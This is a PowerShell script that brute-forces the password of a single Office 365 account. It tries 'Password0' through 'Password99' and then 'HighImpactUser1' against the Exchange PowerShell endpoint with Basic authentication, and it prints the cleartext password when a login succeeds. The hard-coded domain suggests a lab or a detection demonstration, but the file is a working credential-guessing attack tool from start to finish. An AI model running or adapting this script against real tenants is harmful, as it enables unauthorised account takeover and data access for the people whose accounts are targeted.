﻿Import-Module MSOnline


function IsWorkingO365Cred{
    Param(
        [parameter(Mandatory=$true)]
        [System.Management.Automation.PSCredential]
        $O365Cred
    )
    $Office365 = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri `
        https://ps.outlook.com/powershell -Credential $O365Cred -Authentication Basic `
        -AllowRedirection

    Connect-MsolService -Credential $O365Cred -ErrorAction SilentlyContinue
    
    # check if we can get a result from this... if so, we good
    $Domains = Get-MsolDomain -ErrorAction SilentlyContinue
    if ($Domains){
        Write-Host "[+] Found password!" -ForegroundColor Green
        Write-Host "$($username):`t$passwordCleartext" -ForegroundColor Green
        return true #exit program
    }
    else {
        Write-Host "[-] Failed" -ForegroundColor Red
    }        
}

$username = "lisav@seccxp.ninja"
$x = [int]100

$passwordBase = "Password"
$password = $passwordBase

# poor man way to attempt 100 silly passwords
$i = 0
while ($i -lt $x){
    $passwordCleartext = "$passwordBase"+"$i"
    Write-Host "Attempt $i`t$passwordCleartext"
    $password = $passwordCleartext | ConvertTo-SecureString -AsPlainText -Force
    $O365Cred = New-Object System.Management.Automation.PSCredential($username,$password)
    
    if (IsWorkingO365Cred -O365Cred $O365Cred){
        break
    }

    $i++
}
$passwordCleartext = "HighImpactUser1"
Write-Host "Last attempt`t$passwordCleartext"
$password = $passwordCleartext | ConvertTo-SecureString -AsPlainText -Force
    
$O365Cred = New-Object System.Management.Automation.PSCredential($username,$password)
    
$Office365 = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri `
    https://ps.outlook.com/powershell -Credential $O365Cred -Authentication Basic `
    -AllowRedirection
    
IsWorkingO365Cred -O365Cred $O365Cred